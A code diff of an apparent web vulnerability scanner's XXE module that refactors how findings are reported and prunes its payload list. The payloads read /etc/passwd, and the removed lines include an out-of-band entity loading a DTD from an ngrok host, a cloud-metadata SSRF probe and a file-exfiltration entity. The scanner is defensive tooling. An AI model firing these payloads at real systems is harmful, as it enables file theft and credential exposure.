@@ -1,3 +1,7 @@
+'use strict';
+
+const { mkFinding, CONFIDENCE } = require('./evidence');
+
 const XXE_PAYLOADS = [
   {
     name: 'Basic XXE - /etc/passwd',
@@ -12,28 +16,10 @@ const XXE_PAYLOADS = [
     indicator: '[fonts]',
   },
   {
-    name: 'Blind XXE Out-of-Band',
-    severity: 'critical',
-    payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[3a25ec73.ngrok.io]/xxe.dtd"> %xxe;]><root><name>test</name></root>',
-    indicator: 'xxe',
-  },
-  {
-    name: 'XXE - SSRF via file',
-    severity: 'high',
-    payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><name>&xxe;</name></root>',
-    indicator: 'ami-id',
-  },
-  {
     name: 'XXE - PHP wrapper',
     severity: 'high',
     payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root><name>&xxe;</name></root>',
-    indicator: 'cm9vd',
-  },
-  {
-    name: 'XXE - Parameter Entity',
-    severity: 'high',
-    payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://localhost/?f=%file;\'>">%eval;]><root><name>&exfil;</name></root>',
-    indicator: 'root',
+    indicator: 'cm9vdDo',
   },
   {
     name: 'XXE - XInclude',
@@ -71,23 +57,23 @@ async function scanXXE(targetUrl, httpClient) {
   for (const result of postResults) {
     if (result.status === 'fulfilled' && result.value) {
       const { test, body, contentType } = result.value;
-      vulnerabilities.push({
+      vulnerabilities.push(mkFinding('xxe', {
         type: 'xxe',
         severity: test.severity,
+        confidence: CONFIDENCE.CONFIRMED,
         title: `XML External Entity (XXE) - ${test.name}`,
-        description: `XXE injection detected using ${test.name}. The server processed an external entity and returned the content.`,
+        description: `XXE injection detected using ${test.name}. The server parsed the external entity and returned its contents in the response.`,
         endpoint: baseUrl,
         parameter: 'POST Body (XML)',
         payload: test.payload.substring(0, 100) + '...',
-        evidence: `Test: ${test.name}\nContent-Type: application/xml\nResponse Content-Type: ${contentType}\nIndicator found: "${test.indicator}"\nResponse snippet: ${body.substring(0, 300)}`,
-        remediation: 'Disable XML external entity processing. Use less complex data formats like JSON. Configure XML parsers to disable DOCTYPE declarations.',
+        evidence: `Test: ${test.name}\nRequest Content-Type: application/xml\nResponse Content-Type: ${contentType}\nIndicator found: "${test.indicator}"\nResponse snippet: ${body.substring(0, 300)}`,
+        remediation: 'Disable XML external entity processing. Prefer JSON, or configure XML parsers to reject DOCTYPE declarations.',
         owasp_category: 'A05:2021 – Security Misconfiguration',
         cve_id: 'CWE-611',
-      });
+      }));
     }
   }
 
-  // GET-based XXE tests (parallel per param)
   for (const param of XXE_PARAMS) {
     const getResults = await Promise.allSettled(XXE_PAYLOADS.slice(0, 2).map(test => {
       const testUrl = `${baseUrl}?${param}=${encodeURIComponent(test.payload)}`;
@@ -107,19 +93,20 @@ async function scanXXE(targetUrl, httpClient) {
     for (const result of getResults) {
       if (result.status === 'fulfilled' && result.value) {
         const { param, test } = result.value;
-        vulnerabilities.push({
+        vulnerabilities.push(mkFinding('xxe', {
           type: 'xxe',
           severity: test.severity,
+          confidence: CONFIDENCE.CONFIRMED,
           title: `XML External Entity (XXE) via GET - ${test.name}`,
-          description: `XXE injection via GET parameter "${param}". Server processed external entity from query string.`,
+          description: `XXE injection via GET parameter "${param}". The server processed the external entity from the query string and returned its contents.`,
           endpoint: baseUrl,
           parameter: param,
           payload: `${param}=${encodeURIComponent(test.payload.substring(0, 50))}...`,
           evidence: `Test: ${test.name}\nParameter: ${param}\nIndicator found: "${test.indicator}"`,
-          remediation: 'Disable XML external entity processing. Validate and sanitize all input.',
+          remediation: 'Disable XML external entity processing and validate all input.',
           owasp_category: 'A05:2021 – Security Misconfiguration',
           cve_id: 'CWE-611',
-        });
+        }));
         break;
       }
     }
